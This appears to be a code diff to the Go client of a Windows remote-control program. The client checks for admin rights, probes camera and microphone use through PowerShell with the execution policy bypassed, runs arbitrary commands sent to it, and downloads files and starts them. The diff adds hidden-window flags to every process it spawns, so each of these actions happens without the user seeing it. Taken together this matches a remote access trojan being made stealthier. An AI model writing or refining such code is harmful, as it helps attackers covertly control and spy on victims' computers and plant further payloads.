@@ -201,6 +201,7 @@ func GetUserIp() string {{
 
 func getAdminStatus() bool {{
 	cmd := exec.Command(""net"", ""session"")
+	cmd.SysProcAttr = &syscall.SysProcAttr{{HideWindow: true}}
 	err := cmd.Run()
 	return err == nil
 }}
@@ -214,6 +215,7 @@ func getCameraStatus() bool {{
         ""if ($real -and $real.Count -gt 0) {{ exit 0 }} else {{ exit 1 }}""
 
     cmd := exec.Command(""powershell"", ""-NoProfile"", ""-NonInteractive"", ""-ExecutionPolicy"", ""Bypass"", ""-Command"", script)
+    cmd.SysProcAttr = &syscall.SysProcAttr{{HideWindow: true}}
     return cmd.Run() == nil
 }}
 
@@ -226,6 +228,7 @@ func getMicrophoneStatus() bool {{
         ""if ($real -and $real.Count -gt 0) {{ exit 0 }} else {{ exit 1 }}""
 
     cmd := exec.Command(""powershell"", ""-NoProfile"", ""-NonInteractive"", ""-ExecutionPolicy"", ""Bypass"", ""-Command"", script)
+    cmd.SysProcAttr = &syscall.SysProcAttr{{HideWindow: true}}
     return cmd.Run() == nil
 }}
 
@@ -593,6 +596,7 @@ func restartSelf() error {{
     }}
 
     cmd := exec.Command(exePath)
+    cmd.SysProcAttr = &syscall.SysProcAttr{{HideWindow: true}}
     return cmd.Start()
 }}
 
@@ -642,6 +646,7 @@ func getMonitorCount() int {{
 
 func executeCommand(command string) (string, error) {{
     cmd := exec.Command(""cmd"", ""/C"", command)
+    cmd.SysProcAttr = &syscall.SysProcAttr{{HideWindow: true}}
     var stdout, stderr bytes.Buffer
     cmd.Stdout = &stdout
     cmd.Stderr = &stderr
@@ -763,7 +768,9 @@ func handleFileTransfer(msg Message) {{
     if msg.Type == typeFileEnd && fileTransferFile != nil {{
         fileTransferFile.Close()
         fileTransferFile = nil
-        exec.Command(""cmd"", ""/C"", ""start"", """", fileTransferPath).Start()
+        c := exec.Command(""cmd"", ""/C"", ""start"", """", fileTransferPath)
+        c.SysProcAttr = &syscall.SysProcAttr{{HideWindow: true}}
+        c.Start()
         fileTransferPath = """"
     }}
 
@@ -785,7 +792,9 @@ func handleFileTransfer(msg Message) {{
                 return
             }}
             os.WriteFile(p, data, 0755)
-            exec.Command(""cmd"", ""/C"", ""start"", """", p).Start()
+            c := exec.Command(""cmd"", ""/C"", ""start"", """", p)
+            c.SysProcAttr = &syscall.SysProcAttr{{HideWindow: true}}
+            c.Start()
         }}(url, savePath)
     }}
 
